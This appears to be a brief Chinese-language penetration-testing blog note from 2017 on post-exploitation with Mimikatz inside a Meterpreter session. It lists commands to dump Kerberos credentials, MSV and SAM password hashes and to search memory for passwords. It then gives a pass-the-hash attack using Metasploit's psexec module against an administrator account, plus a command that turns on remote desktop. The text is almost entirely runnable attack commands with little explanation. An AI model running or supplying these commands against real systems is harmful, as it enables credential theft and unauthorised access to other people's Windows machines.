Title: Mimikatz
Category: Pentest
Date: 2017-5-27
slug: mimikatz

获取metepreter之后，可以

<https://www.offensive-security.com/metasploit-unleashed/mimikatz/>

```
加载mimikata模块:
load mimikatz    

查看帮助:
help mimikatz

获取密码:
kerberos

获取hash和password
msv

mimikatz_command -f fu::

mimikatz_command -f samdump::hashes 查看hash

mimikatz_command -f handle::list  msf查看超时
 mimikatz_command -f sekurlsa::searchPasswords
```

知道hash不能破解密码情况下可以这样: 445要开启

```
use exploit/windows/smb/psexec
show options
set rhost x.x.x.x
set smbpass  hash数值
set smbuser administrator
run
```

run getgui -e  打开rdp
